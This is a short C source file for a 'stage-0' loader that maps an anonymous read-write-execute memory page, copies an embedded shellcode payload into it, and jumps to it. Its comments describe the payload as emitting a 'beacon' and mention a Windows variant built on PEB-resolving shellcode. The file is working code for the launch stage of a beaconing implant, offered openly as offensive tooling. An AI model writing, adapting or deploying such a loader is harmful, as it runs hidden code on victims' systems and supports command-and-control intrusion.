/*
 * stage0.c — stage-0 loader (the "coupler").
 *
 *   The executable's real entry. It does NOT run the payload from its own
 *   image: it allocates a fresh anonymous RWX page, copies the embedded,
 *   position-independent payload blob into it, and jumps to the copy. The
 *   payload therefore executes from self-chosen RWX memory, decoupled from
 *   this binary's .text — the classic stage-0 -> shellcode handoff.
 *
 *   The blob is injected at build time: tools/bin2c.py emits payload.h
 *   defining `payload` / `payload_len`, which this file includes.
 *
 *   Portable across the Unix targets (Linux, macOS). On Windows the PE
 *   wrapper's entry points straight at the PEB-resolving shellcode instead.
 */
#define _GNU_SOURCE
#include <sys/mman.h>
#include <string.h>
#include <stddef.h>

#include "payload.h"

typedef void (*payload_fn)(void);

int main(void)
{
    void *page = mmap(NULL, payload_len,
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        return 1;

    memcpy(page, payload, payload_len);

    payload_fn run = (payload_fn)page;
    run();            /* payload emits its beacon and exits the process */
    return 0;         /* (only reached if the payload returns) */
}
